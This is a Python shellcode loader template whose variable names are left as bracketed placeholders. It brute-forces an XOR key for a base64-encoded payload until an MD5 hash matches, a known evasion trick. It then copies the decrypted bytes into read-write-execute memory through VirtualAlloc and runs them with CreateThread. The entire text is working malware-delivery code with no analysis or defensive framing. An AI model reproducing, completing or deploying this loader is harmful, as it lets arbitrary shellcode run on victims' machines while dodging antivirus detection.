def [xor]([message], [key]):
    [toret] = ''
    for [c], [k] in [itools].izip([message], [itools].cycle([key])):
        [toret] += chr(ord([c]) ^ ord([k]))
    return [toret]

[encrypted] = "[CRYPTED]"

[amount] = 1
[found] = False
while True:
    for [currkey] in [itools].product([stst].digits+[stst].ascii_lowercase+[stst].ascii_uppercase, repeat=[amount]):
        [decrypted] = [xor]([bed].decodestring([encrypted]), str(''.join([currkey])))
        #print str(''.join(p))
        if [HL].md5([decrypted]).hexdigest().upper() == "[MD5SUM]":
            [valloc] = [types].windll.kernel32.VirtualAlloc([types].c_int(0),[types].c_int(len(bytearray([decrypted]))),[types].c_int(0x3000),[types].c_int(0x40))
            [frombuffer] = ([types].c_char * len(bytearray([decrypted]))).from_buffer(bytearray([decrypted]))
            [types].windll.kernel32.RtlMoveMemory([types].c_int([valloc]),[frombuffer],[types].c_int(len(bytearray([decrypted]))))
            [cThread] = [types].windll.kernel32.CreateThread([types].c_int(0),[types].c_int(0),[types].c_int([valloc]),[types].c_int(0),[types].c_int(0),[types].pointer([types].c_int(0)))
            [types].windll.kernel32.WaitForSingleObject([types].c_int([cThread]),[types].c_int(-1))
            [found] = True
            break
    if [found] == True:
        break
    [amount] += 1
